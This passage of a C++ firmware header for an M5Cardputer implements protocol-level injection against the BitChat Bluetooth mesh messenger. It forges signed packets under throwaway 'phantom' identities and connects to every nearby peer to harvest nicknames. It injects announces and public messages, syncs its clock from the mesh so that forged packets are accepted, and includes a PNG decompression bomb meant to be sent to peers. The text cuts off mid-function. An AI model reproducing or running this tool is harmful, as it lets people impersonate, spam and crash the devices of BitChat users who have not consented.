#pragma once
// ============================================================================
//  bitchat_poison.h  -  Injection protocolaire sur le mesh BLE de BitChat
//  (dans l'esprit de PoisonMesh/PoisonCore, mais radio BLE au lieu de LoRa).
//
//  PAS DE JAMMING. Uniquement de l'injection AU NIVEAU PROTOCOLE sur le canal
//  PUBLIC (en clair). Les DM sont chiffres Noise XX -> hors scope.
//
//  AUTHORIZED USE ONLY. A n'utiliser que sur ton propre materiel/mesh ou avec
//  autorisation explicite. Transmet en BLE et perturbe par conception.
//
//  ZERO RAM au boot : BLEDevice::init seulement a l'entree du menu, deinit a la
//  sortie ; scan/client/listes alloues au runtime, liberes a la sortie.
//  Header auto-contenu ; expose void bitchatPoisonMenu();
//
//  --- Faits protocole (sources officielles permissionlesstech/bitchat) ---
//  * Service UUID  (mainnet) : F47B5E2D-4A9E-4C5A-9B3F-8E1D2C3A4B5C
//    (BLEService.swift:189 ; testnet ...4B5A:187)
//  * Characteristic UUID     : A1B2C3D4-E5F6-4A5B-8C9D-0E1F2A3B4C5D
//    (BLEService.swift:191)
//  * Paquet v1 (BinaryProtocol.swift) header 14 o, big-endian :
//      version(1)=1 | type(1) | ttl(1) | timestamp(8, ms) | flags(1) | payloadLen(2)
//    puis senderID(8) | [recipientID(8) si flag] | payload | [signature(64) si flag]
//  * Flags : hasRecipient=0x01, hasSignature=0x02, isCompressed=0x04
//  * TTL d'origine = 7 (clamp relais 5/7 selon densite). Signatures EXCLUENT le
//    byte TTL (les relais le decrementent sans invalider).  (WHITEPAPER.md 4.1/4.2)
//  * Announce = TLV en clair toutes les 4-30 s : nickname=0x01, noisePublicKey=0x02,
//    signingPublicKey=0x03, directNeighbors=0x04, capabilities=0x05 (Packets.swift).
//  * Dedup LRU 1000/5min (sender+timestamp+type+digest). Public cache 1000, 6 h.
//
//  --- INCERTITUDES (documentees, parametrables, pas inventees) ---
//  * Valeurs EXACTES du enum MessageType EXTERNE : non trouvees dans les fichiers
//    lus (reference via MessageType.message/.announce.rawValue dans BLEService.swift
//    mais enum non localise). Defauts canoniques (releases BitChat historiques) :
//    ANNOUNCE=0x01, LEAVE=0x03, MESSAGE=0x04. MODIFIABLES ci-dessous ; a verifier
//    contre la cible (sniff passif inclus pour les lire).
//  * Encodage longueur TLV announce (1 vs 2 o) et format exact du payload de
//    message public (BitchatMessage) : non captures -> on envoie un announce TLV
//    minimal (longueur 1 o, usage courant) et un message en payload brut UTF-8.
//    A affiner apres sniff/relecture de AnnouncementPacket.decode.
//  * Entree exacte signee (TTL exclu) : on signe header+sender+payload avec TTL=0.
// ============================================================================
#include <Arduino.h>
#include <WiFi.h>
#include "mbedtls/sha256.h"   // senderID = SHA256(noisePublicKey)[:8]
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEClient.h>
#include <BLEServer.h>
#include <BLE2902.h>
#include <BLEAdvertisedDevice.h>
#include <vector>
#include <deque>
#include <map>                 // senderID -> pseudo (onglet chat)
#include <SD.h>                // envoi de fichiers (image/son) depuis la carte SD
#include "pngbomb.h"           // PNG decompression bomb embarquee (Image bomb)
#include <time.h>             // timestamp epoch (anti-stale BitChat)
#include <sys/time.h>         // settimeofday : sync horloge depuis le mesh
#include "poison_ed25519.h"   // orlp/ed25519 (deja vendorise) : keypair + sign

// Helpers du .ino (declares ailleurs) : kp(), kpAny(), cardUpdate(), promptInput()
bool kp(uint8_t);
void cardUpdate();
String promptInput(const char*);
void enterDebounce();
void keyRelease();

namespace bcp {

static const char* SVC_UUID = "F47B5E2D-4A9E-4C5A-9B3F-8E1D2C3A4B5C";
static const char* CHR_UUID = "A1B2C3D4-E5F6-4A5B-8C9D-0E1F2A3B4C5D";

// Type-bytes EXTERNES - defauts canoniques, A VERIFIER (voir incertitudes).
static uint8_t T_ANNOUNCE = 0x01;
static uint8_t T_LEAVE    = 0x03;
static uint8_t T_MESSAGE  = 0x02;   // public chat message (BitFoundation/MessageType.swift) - 0x04 etait courierEnvelope (bug reintroduit par un fork, re-corrige)

static const uint8_t F_HASREC = 0x01, F_HASSIG = 0x02;
static const uint8_t TLV_NICK = 0x01, TLV_NOISEPK = 0x02, TLV_SIGNPK = 0x03, TLV_CAPS = 0x05;
static const uint8_t TTL_DEFAULT = 7;

// ---- Cible BLE decouverte ----
struct Peer { String name; String addr; };

// ---- UI liste au theme Evil (menu*Color, comme loopOptions) ----
static void drawList(const char* title, const std::vector<String>& rows, int idx, const char* help) {
  auto& d = M5Cardputer.Display;
  d.clear(); d.setTextWrap(false, false);
  d.setTextSize(1);                                   // titre + aide en petit (secondaires)
  d.setTextColor(menuTextFocusedColor, menuBackgroundColor); d.setCursor(4, 2); d.println(title);
  d.setTextSize(menuTextSize);                        // ELEMENTS a la taille du menu principal
  int top = 15, lh = menuLineH + 3, maxRows = (d.height() - top - 12) / lh; if (maxRows < 1) maxRows = 1;
  int first = 0;
  if ((int)rows.size() > maxRows) { first = idx - maxRows / 2; if (first < 0) first = 0;
    if (first > (int)rows.size() - maxRows) first = rows.size() - maxRows; }
  for (int r = 0; r < maxRows && first + r < (int)rows.size(); r++) {
    int i = first + r, y = top + r * lh;
    if (i == idx) { d.fillRect(0, y - 1, d.width(), lh, menuSelectedBackgroundColor);
                    d.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor); }
    else d.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    d.setCursor(6, y); d.print(rows[i]);
  }
  d.setTextSize(1);
  d.setTextColor(menuTextUnFocusedColor, menuBackgroundColor); d.setCursor(4, d.height() - 10); d.print(help);
  d.display();
}
static int selectList(const char* title, const std::vector<String>& rows, const char* help) {
  if (rows.empty()) return -1;
  int idx = 0, last = -1;
  for (;;) {
    if (idx != last) { drawList(title, rows, idx, help); last = idx; }
    cardUpdate();
    if (kp(KEY_BACKSPACE) || kp('`')) { backDebounce(); return -1; }  // DEL = retour (attend relache -> pas de double-back)
    if (kp(KEY_ENTER)) { enterDebounce(); return idx; }   // edge-debounce: attend relache -> pas de saut
    if (kp(';')) { idx = (idx + rows.size() - 1) % rows.size(); delay(140); }
    if (kp('.')) { idx = (idx + 1) % rows.size(); delay(140); }
    delay(8);
  }
}
static void status(const char* l1, const char* l2 = nullptr, uint16_t c = 0) {
  auto& d = M5Cardputer.Display; d.clear(); d.setTextSize(1); d.setTextWrap(false, false);
  if (c == 0) c = menuTextFocusedColor;
  d.setTextColor(c, menuBackgroundColor); d.setCursor(4, 20); d.print(l1);
  if (l2) { d.setTextColor(menuTextUnFocusedColor, menuBackgroundColor); d.setCursor(4, 38); d.print(l2); }
  d.display();
}
static int askNum(const char* prompt, int def) {
  String s = promptInput(prompt); s.trim();
  if (!s.length()) return def; int v = s.toInt(); return v > 0 ? v : def;
}

// ---- Construction d'un paquet v1 (signe optionnel ; TTL exclu de la signature) ----
static void appendU64BE(std::vector<uint8_t>& v, uint64_t x) {
  for (int s = 56; s >= 0; s -= 8) v.push_back((x >> s) & 0xFF);
}
// senderID 8o, payload, ttl, type. Si priv!=nullptr -> signe (hasSignature).
static std::vector<uint8_t> buildPacket(uint8_t type, const uint8_t sender[8], uint8_t ttl,
                                        const uint8_t* payload, size_t plen,
                                        const uint8_t* pub32, const uint8_t* priv64) {
  std::vector<uint8_t> p;
  p.reserve(22 + plen + (priv64 ? 64 : 0));   // 1 seule alloc (pas de realloc/fragmentation sur gros payload type image)
  uint8_t flags = 0; if (priv64) flags |= F_HASSIG;
  p.push_back(1);              // version
  p.push_back(type);           // type
  p.push_back(ttl);            // ttl
  // Timestamp EPOCH ms reel : BitChat rejette tout paquet > 15 min (policy staleBroadcast)
  // -> millis() (~epoch 1970) = rejete, peer jamais visible. Heure synced NTP a l'entree.
  time_t _now = time(nullptr);
  uint64_t _ts = (_now > 1700000000) ? ((uint64_t)_now * 1000ULL + (millis() % 1000)) : (uint64_t)millis();
  appendU64BE(p, _ts);
  p.push_back(flags);          // flags
  p.push_back((plen >> 8) & 0xFF); p.push_back(plen & 0xFF);  // payloadLen (v1, 2o BE)
  for (int i = 0; i < 8; i++) p.push_back(sender[i]);         // senderID
  for (size_t i = 0; i < plen; i++) p.push_back(payload[i]);  // payload
  if (priv64) {
    // BitChat signe toBinaryDataForSigning = encode(paquet SANS signature, TTL=0, padding=true).
    // Le padding (MessagePadding) complete le paquet a un bloc optimal (256/512/..., len+16<=bloc)
    // facon PKCS#7 : ajoute (bloc-len) octets valant (bloc-len). La signature couvre ce buffer PADDE.
    size_t L = p.size(), total = L + 16, bs = L;
    const size_t BL[4] = {256, 512, 1024, 2048};
    for (int b = 0; b < 4; b++) if (total <= BL[b]) { bs = BL[b]; break; }
    uint8_t sv2 = p[2], sv11 = p[11];
    p[2] = 0; p[11] &= ~F_HASSIG;                        // signature sur TTL=0 + flag HASSIG clear
    uint8_t sig[64];
    if (bs > L && (bs - L) <= 255) {                    // petit paquet : padding -> copie (bon marche car petite)
      std::vector<uint8_t> toSign; toSign.reserve(bs); toSign = p;
      uint8_t pv = (uint8_t)(bs - L); for (size_t i = 0; i < (bs - L); i++) toSign.push_back(pv);
      ed25519_sign(sig, toSign.data(), toSign.size(), pub32, priv64);
    } else {                                            // gros paquet (image) : pas de padding -> signe EN PLACE (zero copie -> evite l'OOM)
      ed25519_sign(sig, p.data(), p.size(), pub32, priv64);
    }
    p[2] = sv2; p[11] = sv11;                            // restore TTL + flag pour le paquet transmis
    for (int i = 0; i < 64; i++) p.push_back(sig[i]);   // paquet transmis NON paddE (le tel depad au decode)
  }
  return p;
}

// ---- Identite fantome : keypair Ed25519 (signing) + noise static + senderID=SHA256(noise)[:8] ----
struct Phantom { uint8_t pub[32], priv[64], noise[32], id[8]; };
static Phantom makePhantom() {
  Phantom ph; uint8_t seed[32];
  for (int i = 0; i < 32; i++) seed[i] = (uint8_t)esp_random();
  ed25519_create_keypair(ph.pub, ph.priv, seed);      // cle de signature Ed25519
  for (int i = 0; i < 32; i++) ph.noise[i] = (uint8_t)esp_random();  // cle "noise" (32 o)
  // senderID = SHA256(noisePublicKey)[0:8] -- BitChat derive le peerID ainsi
  // (PeerID(publicKey:) = sha256Fingerprint(noisePK).prefix(16 hex) = 8 octets).
  uint8_t dig[32];
  mbedtls_sha256(ph.noise, 32, dig, 0);
  memcpy(ph.id, dig, 8);
  return ph;
}
// Payload announce TLV minimal : nickname + signingPK + noisePK (+ caps vide).
static std::vector<uint8_t> buildAnnouncePayload(const Phantom& ph, const String& nick) {
  std::vector<uint8_t> v;
  auto tlv = [&](uint8_t t, const uint8_t* d, uint8_t l) {
    v.push_back(t); v.push_back(l); for (int i = 0; i < l; i++) v.push_back(d[i]); };
  tlv(TLV_NICK, (const uint8_t*)nick.c_str(), (uint8_t)min((int)nick.length(), 30));
  tlv(TLV_SIGNPK, ph.pub, 32);      // cle de signature Ed25519
  tlv(TLV_NOISEPK, ph.noise, 32);   // cle noise (celle d'ou derive le senderID)
  return v;
}

// ---- Ecriture d'un paquet vers un pair connecte (BLEClient fourni) ----
static bool writePacket(BLERemoteCharacteristic* chr, const std::vector<uint8_t>& pkt) {
  if (!chr) return false;
  chr->writeValue((uint8_t*)pkt.data(), pkt.size(), false);  // write no-response
  return true;
}

// ============================================================================
//  CLIENT MESH : monitor temps reel (participe) + envoi + relais
// ============================================================================
// Evenement decode d'un paquet v1 recu
struct RxEvt { uint8_t type; char sender[17]; String text; };
static bool parsePacket(const uint8_t* p, size_t n, RxEvt& ev) {
  if (n < 14 || p[0] != 1) return false;
  ev.type = p[1];
  uint8_t flags = p[11];
  uint16_t plen = (uint16_t)((p[12] << 8) | p[13]);
  size_t off = 14;
  if (off + 8 > n) return false;
  for (int i = 0; i < 8; i++) sprintf(ev.sender + i * 2, "%02X", p[off + i]);
  ev.sender[16] = 0;
  off += 8;
  if (flags & F_HASREC) off += 8;                       // recipientID
  size_t avail = (off + plen <= n) ? plen : (n > off ? n - off : 0);
  const uint8_t* pl = p + off;
  ev.text = "";
  if (ev.type == T_ANNOUNCE) {                           // TLV -> nickname (0x01)
    size_t i = 0;
    while (i + 2 <= avail) {
      uint8_t t = pl[i], l = pl[i + 1]; i += 2;
      if (i + l > avail) break;
      if (t == TLV_NICK) { for (int k = 0; k < l; k++) ev.text += (char)pl[i + k]; break; }
      i += l;
    }
    if (!ev.text.length()) ev.text = "(announce)";
  } else {                                               // message/autre : texte sinon hex
    bool printable = (avail > 0);
    for (size_t i = 0; i < avail && i < 64; i++)
      if ((pl[i] < 0x20 || pl[i] > 0x7e) && pl[i] != '\n' && pl[i] != '\r') { printable = false; break; }
    if (printable) for (size_t i = 0; i < avail && i < 80; i++) ev.text += (char)pl[i];
    else { char b[4]; for (size_t i = 0; i < avail && i < 24; i++) { sprintf(b, "%02X", pl[i]); ev.text += b; } }
  }
  return true;
}

// Buffers alloues au runtime (0 RAM boot) ; pointeurs nuls au repos.
static std::deque<String>* g_mon = nullptr;
static std::vector<std::vector<uint8_t>>* g_relayQ = nullptr;
static volatile uint32_t g_rxCount = 0;
static bool g_doRelay = false;

static void monPush(const String& s) {
  Serial.println("[BCMON] " + s);   // echo serie : le flux live (peers/messages/type brut) lisible par agent
  if (!g_mon) return;
  g_mon->push_back(s);
  while (g_mon->size() > 120) g_mon->pop_front();
}
// Synchronise l'horloge depuis le timestamp d'un paquet mesh recu (epoch ms BE @ off 3).
// Rend BitChat autonome : plus besoin de WiFi/NTP, le tel (ou tout pair) donne l'heure.
// Sans horloge valide, nos paquets sont stale -> rejetes. Retourne true si vient de sync.
static bool bcSyncClockFromPacket(const uint8_t* p, size_t n) {
  if (n < 11 || time(nullptr) > 1700000000) return false;   // deja synchro
  uint64_t ts = 0; for (int i = 0; i < 8; i++) ts = (ts << 8) | p[3 + i];
  uint64_t sec = ts / 1000ULL;
  if (sec > 1700000000ULL && sec < 2000000000ULL) {          // plausible 2023..2033
    struct timeval tv; tv.tv_sec = (time_t)sec; tv.tv_usec = (suseconds_t)((ts % 1000) * 1000);
    settimeofday(&tv, nullptr);
    Serial.printf("[BC] clock synced from mesh: epoch=%lu\n", (unsigned long)sec);
    return true;
  }
  return false;
}
// Callback notify minimal pour les ATTAQUES : cale juste l'horloge sur le mesh.
// Sans ca, clockOk=0 -> timestamps a ~1970 -> le pair rejette TOUS nos paquets
// (Public Spam / TTL / fichier semblaient "ne pas fonctionner"). Pas de relais ici.
static volatile uint32_t g_atkRx = 0;
static void atkSyncCB(BLERemoteCharacteristic*, uint8_t* data, size_t len, bool) {
  g_atkRx++;
  bcSyncClockFromPacket(data, len);
}
// Callback notify BLE : decode + journalise + file de relais (TTL--)
static void notifyCB(BLERemoteCharacteristic*, uint8_t* data, size_t len, bool) {
  g_rxCount++;
  bcSyncClockFromPacket(data, len);   // cale l'horloge sur le mesh si pas encore synchro
  RxEvt ev;
  if (parsePacket(data, len, ev)) {
    const char* tag = (ev.type == T_ANNOUNCE) ? "PEER" : (ev.type == T_MESSAGE ? "MSG " : "TYPE");
    char tb[6]; sprintf(tb, "%02X", ev.type);
    monPush("[" + String(tag) + "] " + String(ev.sender).substring(0, 8) + " t=" + tb + " " + ev.text);
    if (g_doRelay && g_relayQ && len >= 14 && data[2] > 1) {
      std::vector<uint8_t> v(data, data + len); v[2] = (uint8_t)(data[2] - 1);   // decremente TTL
      g_relayQ->push_back(v);
    }
  } else {
    String hx; for (size_t i = 0; i < len && i < 24; i++) { char b[4]; sprintf(b, "%02X", data[i]); hx += b; }
    monPush("[RAW ] " + String((unsigned)len) + "o " + hx);   // dump en-tete pour calibrer le format reel
  }
}

// --- Resolution du pseudo d'un pair -----------------------------------------
// BitChat ne met PAS le nickname dans l'advertisement BLE (seul le service UUID y est, +
// un peerID ephemere). Le pseudo arrive dans un paquet "announce" (TLV_NICK) via GATT.
// Pour afficher les vrais noms dans la liste, on se connecte brievement a chaque pair, on
// lui envoie notre announce (il re-announce en reponse), on lit le sien, puis on coupe.
static volatile bool g_harvDone = false;
static String g_harvNick;
static void harvestCB(BLERemoteCharacteristic*, uint8_t* data, size_t len, bool) {
  RxEvt ev;
  if (parsePacket(data, len, ev) && ev.type == T_ANNOUNCE && ev.text.length() && ev.text != "(announce)") {
    g_harvNick = ev.text; g_harvDone = true;
  }
}
// Remplit 'nicks' (meme taille que peers) avec le pseudo resolu ("" si echec). Borne : 1.5 s/pair.
static void harvestNicks(std::vector<BLEAdvertisedDevice>& peers, std::vector<String>& nicks) {
  nicks.assign(peers.size(), String(""));
  if (peers.empty()) return;
  BLEClient* c = BLEDevice::createClient();                 // reutilise pour tous les pairs
  bool abort = false;
  uint32_t harvT0 = millis();                               // budget global : borne le temps total de resolution
  for (size_t k = 0; k < peers.size(); k++) {
    cardUpdate();
    if (kp(KEY_BACKSPACE) || kp('`')) { keyRelease(); break; }   // DEL = skip la resolution des pairs restants
    if (millis() - harvT0 > 9000) break;                        // au-dela de 9s on montre ce qu'on a (reste = @MAC)
    status("Resolving names... DEL=skip", (String((int)k + 1) + "/" + (int)peers.size() + "  " + peers[k].getAddress().toString().c_str()).c_str(), TFT_CYAN);
    g_harvDone = false; g_harvNick = "";
    if (c->connect(&peers[k])) {
      c->setMTU(517);
      BLERemoteService* s = c->getService(BLEUUID(SVC_UUID));
      BLERemoteCharacteristic* ch = s ? s->getCharacteristic(BLEUUID(CHR_UUID)) : nullptr;
      if (ch && ch->canNotify()) {
        ch->registerForNotify(harvestCB);
        Phantom me = makePhantom();
        auto pl  = buildAnnouncePayload(me, "cardputer");
        auto pkt = buildPacket(T_ANNOUNCE, me.id, TTL_DEFAULT, pl.data(), pl.size(), me.pub, me.priv);
        ch->writeValue(pkt.data(), pkt.size(), false);
        uint32_t t0 = millis();
        while (!g_harvDone && millis() - t0 < 800 && c->isConnected()) {   // attente announce reduite
          cardUpdate();
          if (kp(KEY_BACKSPACE) || kp('`')) { abort = true; break; }       // skip pendant l'attente
          delay(15);
        }
      }
      if (c->isConnected()) c->disconnect();
      delay(50);
    }
    nicks[k] = g_harvNick;
    if (abort) { keyRelease(); break; }
  }
}

// Participe a la mesh : connexion central a un pair, abonnement notify, affichage
// live des pairs/messages, envoi (s) et relais (r). withRelay = relais actif au depart.
static void monitorMode(bool withRelay) {
  status("Monitor: scan BitChat...", "looking for a peer (service)", TFT_CYAN);
  BLEScan* scan = BLEDevice::getScan();
  scan->setActiveScan(true); scan->setInterval(100); scan->setWindow(80);
  BLEScanResults res = scan->start(5, false);
  std::vector<BLEAdvertisedDevice> peers;
  for (int i = 0; i < res.getCount(); i++) {
    BLEAdvertisedDevice dv = res.getDevice(i);
    if (dv.haveServiceUUID() && dv.isAdvertisingService(BLEUUID(SVC_UUID))) peers.push_back(dv);
  }
  scan->clearResults();
  if (peers.empty()) { status("No BitChat peer seen", "DEL/ENTER", TFT_RED);
    while (!kp(KEY_ENTER) && !kp(KEY_BACKSPACE) && !kp('`')) { cardUpdate(); delay(8); } keyRelease(); return; }
  std::vector<String> nicks; harvestNicks(peers, nicks);    // resout les vrais pseudos (announce GATT)
  std::vector<String> rows;
  for (size_t k = 0; k < peers.size(); k++) {
    String nm = nicks[k].length() ? nicks[k] : (peers[k].haveName() ? String(peers[k].getName().c_str()) : String("?"));
    rows.push_back(String(peers[k].getAddress().toString().c_str()) + " " + nm);
  }
  int pi = selectList("Peer to monitor", rows, "ENT=ok  DEL=back");
  if (pi < 0) return;

  status("GATT connect...", rows[pi].c_str(), TFT_CYAN);
  BLEClient* cli = BLEDevice::createClient();
  if (!cli->connect(&peers[pi])) { status("Connect failed", nullptr, TFT_RED); delay(1200); return; }
  cli->setMTU(517);   // negocie un gros MTU : sinon les notify sont tronques a ~20o (MTU ATT par defaut) -> paquets coupes, parse KO
  BLERemoteService* svc = cli->getService(BLEUUID(SVC_UUID));
  BLERemoteCharacteristic* chr = svc ? svc->getCharacteristic(BLEUUID(CHR_UUID)) : nullptr;
  if (!chr) { status("Characteristic absente", nullptr, TFT_RED); cli->disconnect(); delay(1200); return; }

  g_mon = new (std::nothrow) std::deque<String>();
  g_relayQ = new (std::nothrow) std::vector<std::vector<uint8_t>>();
  g_rxCount = 0; g_doRelay = withRelay;
  if (chr->canNotify()) chr->registerForNotify(notifyCB);
  // annonce notre presence (participe) : un announce signe avec un nick fixe
  Phantom me = makePhantom();
  { auto pl = buildAnnouncePayload(me, "cardputer");
    auto pkt = buildPacket(T_ANNOUNCE, me.id, TTL_DEFAULT, pl.data(), pl.size(), me.pub, me.priv);
    chr->writeValue(pkt.data(), pkt.size(), false); monPush("[TX  ] announce cardputer"); }

  auto& d = M5Cardputer.Display;
  uint32_t lastDraw = 0, lastRx = 0xFFFFFFFF;
  while (cli->isConnected()) {
    cardUpdate();
    if (kp(KEY_BACKSPACE) || kp('`')) { backDebounce(); break; }  // attend relache -> pas de sortie en cascade
    if (kp('s')) {                                       // envoyer un message public
      String m = promptInput("Message to send >"); m.trim();
      // garde : la connexion/characteristic peut avoir lache pendant promptInput -> writeValue crasherait
      if (m.length() && cli && cli->isConnected() && chr && ESP.getFreeHeap() > 20000) {
        auto pkt = buildPacket(T_MESSAGE, me.id, TTL_DEFAULT, (const uint8_t*)m.c_str(), m.length(), me.pub, me.priv);
        chr->writeValue(pkt.data(), pkt.size(), false);
        monPush("[TX  ] moi: " + m);
      } else if (m.length()) monPush("[!  ] send KO (disconnected or low heap)");
      lastRx = 0xFFFFFFFF;                               // force redraw
    }
    if (kp('r')) { g_doRelay = !g_doRelay; delay(200); lastRx = 0xFFFFFFFF; }
    if (g_relayQ && !g_relayQ->empty()) {                // flush file de relais
      for (auto& v : *g_relayQ) chr->writeValue(v.data(), v.size(), false);
      g_relayQ->clear();
    }
    if (g_rxCount != lastRx || millis() - lastDraw > 500) {
      lastRx = g_rxCount; lastDraw = millis();
      d.clear(); d.setTextSize(1); d.setTextWrap(false, false);
      d.setTextColor(TFT_GREEN, BLACK); d.setCursor(2, 2);
      d.printf("BitChat mesh  rx=%lu relay=%s", (unsigned long)g_rxCount, g_doRelay ? "ON" : "off");
      int lh = 10, top = 14, maxRows = (d.height() - top - 10) / lh; if (maxRows < 1) maxRows = 1;
      int total = (int)g_mon->size(), start = total > maxRows ? total - maxRows : 0;
      for (int r = 0; r < maxRows && start + r < total; r++) {
        const String& s = (*g_mon)[start + r];
        uint16_t col = s.startsWith("[PEER") ? TFT_CYAN : s.startsWith("[TX") ? TFT_GREEN
                     : s.startsWith("[MSG") ? TFT_WHITE : TFT_DARKGREY;
        d.setTextColor(col, BLACK); d.setCursor(2, top + r * lh); d.print(s.substring(0, 52));
      }
      d.setTextColor(TFT_DARKGREY, BLACK); d.setCursor(2, d.height() - 9); d.print("s=send r=relay DEL=quit");
      d.display();
    }
    delay(10);
  }
  if (chr && chr->canNotify()) chr->registerForNotify(nullptr);
  cli->disconnect();
  delete g_mon; g_mon = nullptr;
  delete g_relayQ; g_relayQ = nullptr;
  g_doRelay = false;
}

// ============================================================================
//  ONGLET CHAT : vrai mode chat (pseudo + "I am part of the network")
//  UI propre "nick: message", identite stable, keepalive presence. L'onglet
//  Monitor reste le mode debug (tags bruts [PEER]/[MSG]/[RAW], compteur rx).
// ============================================================================
static String g_chatNick = "";
static std::map<String, String>* g_nickMap = nullptr;   // senderID(16hex) -> pseudo
static std::deque<String>* g_chat = nullptr;            // lignes "nick: message"
static Phantom* g_chatMe = nullptr;                      // identite stable (alloc runtime : 0 RAM boot)
static volatile uint32_t g_chatRx = 0;

static void chatPush(const String& line) {
  Serial.println("[BCCHAT] " + line);                   // echo serie (agent + verif)
  if (!g_chat) return;
  g_chat->push_back(line);
  while (g_chat->size() > 100) g_chat->pop_front();
}
// Callback notify dedie chat : announce -> map pseudo ; message -> "nick: text"
static void chatNotifyCB(BLERemoteCharacteristic*, uint8_t* data, size_t len, bool) {
  g_chatRx++;
  bcSyncClockFromPacket(data, len);   // cale l'horloge sur le mesh si pas encore synchro
  RxEvt ev;
  if (!parsePacket(data, len, ev)) return;
  String sid = String(ev.sender).substring(0, 16);
  if (ev.type == T_ANNOUNCE) {
    String prev = (g_nickMap && g_nickMap->count(sid)) ? (*g_nickMap)[sid] : String("");
    if (g_nickMap) (*g_nickMap)[sid] = ev.text;
    if (prev != ev.text && ev.text != "(announce)") chatPush("* " + ev.text + " is online");
  } else if (ev.type == T_MESSAGE) {
    String nick = (g_nickMap && g_nickMap->count(sid)) ? (*g_nickMap)[sid] : (String("~") + sid.substring(0, 6));
    chatPush(nick + ": " + ev.text);
  }
}
// maxScroll : nb max de lignes qu'on peut remonter (0 = on voit deja le bas = live)
static int chatMaxScroll() {
  auto& d = M5Cardputer.Display;
  int lh = 10, top = 14, maxRows = (d.height() - top - 10) / lh; if (maxRows < 1) maxRows = 1;
  int total = g_chat ? (int)g_chat->size() : 0;
  return total > maxRows ? total - maxRows : 0;
}
static void chatDraw(int npeers, int scrollOff) {
  auto& d = M5Cardputer.Display;
  d.clear(); d.setTextSize(1); d.setTextWrap(false, false);
  int lh = 10, top = 14, maxRows = (d.height() - top - 10) / lh; if (maxRows < 1) maxRows = 1;
  int total = g_chat ? (int)g_chat->size() : 0;
  int maxScroll = total > maxRows ? total - maxRows : 0;
  if (scrollOff < 0) scrollOff = 0; if (scrollOff > maxScroll) scrollOff = maxScroll;
  int start = (total > maxRows ? total - maxRows : 0) - scrollOff; if (start < 0) start = 0;
  // en-tete : pseudo + pairs, et un marqueur HISTO ambre quand on remonte (plus en live)
  d.setTextColor(menuTextFocusedColor, menuBackgroundColor); d.setCursor(2, 2);
  d.printf("Chat  %s  (%d peer%s)", g_chatNick.c_str(), npeers, npeers > 1 ? "s" : "");
  if (scrollOff > 0) { d.setTextColor(TFT_ORANGE, menuBackgroundColor);
    d.setCursor(d.width() - 60, 2); d.printf("HISTO-%d", scrollOff); }
  for (int r = 0; r < maxRows && start + r < total; r++) {
    const String& s = (*g_chat)[start + r];
    uint16_t col;
    if (s.startsWith("* ")) col = TFT_CYAN;                         // ligne systeme
    else if (s.indexOf(" (toi): ") > 0) col = menuTextFocusedColor; // tes messages (vert)
    else col = menuTextUnFocusedColor;                             // les autres (blanc)
    d.setTextColor(col, menuBackgroundColor); d.setCursor(2, top + r * lh); d.print(s.substring(0, 52));
  }
  d.setTextColor(menuTextUnFocusedColor, menuBackgroundColor); d.setCursor(2, d.height() - 9);
  d.print(scrollOff > 0 ? ";/.=scroll  ,=peers  DEL=quit" : "ENTER=write  ;/.=histo  ,=peers");
  d.display();
}
// Roster : liste les pairs en ligne (sid -> pseudo) du mesh courant. Modal, revient au chat.
static void chatRoster() {
  std::vector<String> rows;
  if (g_nickMap) for (auto& kv : *g_nickMap) rows.push_back(kv.second + "  (" + kv.first.substring(0, 8) + ")");
  if (rows.empty()) rows.push_back("(no announced peer)");
  selectList("Peers online", rows, "ENT/DEL=back");
}
// Mode CHAT : participe reellement au mesh avec un pseudo (identite stable).
static void chatMode() {
  if (!g_chatNick.length()) {
    String n = promptInput("Your nick (def evil) >"); n.trim();
    g_chatNick = n.length() ? n : String("evil");
  }
  status("Chat: scan BitChat...", "looking for the mesh", TFT_CYAN);
  BLEScan* scan = BLEDevice::getScan();
  scan->setActiveScan(true); scan->setInterval(100); scan->setWindow(80);
  BLEScanResults res = scan->start(5, false);
  std::vector<BLEAdvertisedDevice> peers;
  for (int i = 0; i < res.getCount(); i++) {
    BLEAdvertisedDevice dv = res.getDevice(i);
    if (dv.haveServiceUUID() && dv.isAdvertisingService(BLEUUID(SVC_UUID))) peers.push_back(dv);
  }
  scan->clearResults();
  if (peers.empty()) { status("No BitChat mesh seen", "DEL", TFT_RED);
    while (!kp(KEY_ENTER) && !kp(KEY_BACKSPACE) && !kp('`')) { cardUpdate(); delay(8); } keyRelease(); return; }
  std::vector<String> nicks; harvestNicks(peers, nicks);    // vrais pseudos (announce GATT)
  std::vector<String> rows;
  for (size_t k = 0; k < peers.size(); k++) {
    String nm = nicks[k].length() ? nicks[k] : (peers[k].haveName() ? String(peers[k].getName().c_str()) : String("?"));
    rows.push_back(String(peers[k].getAddress().toString().c_str()) + " " + nm);
  }
  int pi = selectList("Join via", rows, "ENT=ok  DEL=back");
  if (pi < 0) return;

  status("Connecting to mesh...", rows[pi].c_str(), TFT_CYAN);
  BLEClient* cli = BLEDevice::createClient();
  if (!cli->connect(&peers[pi])) { status("Connect failed", nullptr, TFT_RED); delay(1200); return; }
  cli->setMTU(517);
  BLERemoteService* svc = cli->getService(BLEUUID(SVC_UUID));
  BLERemoteCharacteristic* chr = svc ? svc->getCharacteristic(BLEUUID(CHR_UUID)) : nullptr;
  if (!chr) { status("Characteristic absente", nullptr, TFT_RED); cli->disconnect(); delay(1200); return; }

  g_nickMap = new (std::nothrow) std::map<String, String>();
  g_chat = new (std::nothrow) std::deque<String>();
  g_chatMe = new (std::nothrow) Phantom();
  if (!g_nickMap || !g_chat || !g_chatMe) { status("Memoire insuffisante", nullptr, TFT_RED); delay(1200);
    cli->disconnect(); delete g_nickMap; g_nickMap = nullptr; delete g_chat; g_chat = nullptr;
    delete g_chatMe; g_chatMe = nullptr; return; }
  *g_chatMe = makePhantom();                 // identite stable toute la session
  g_chatRx = 0;
  if (chr->canNotify()) chr->registerForNotify(chatNotifyCB);
  auto annonce = [&]() {
    auto pl = buildAnnouncePayload(*g_chatMe, g_chatNick);
    auto pkt = buildPacket(T_ANNOUNCE, g_chatMe->id, TTL_DEFAULT, pl.data(), pl.size(), g_chatMe->pub, g_chatMe->priv);
    if (cli->isConnected() && chr) chr->writeValue(pkt.data(), pkt.size(), false);
  };
  annonce();
  chatPush(String("* you joined the mesh as ") + g_chatNick);

  uint32_t lastAnn = millis(), lastDraw = 0, lastRx = 0xFFFFFFFF;
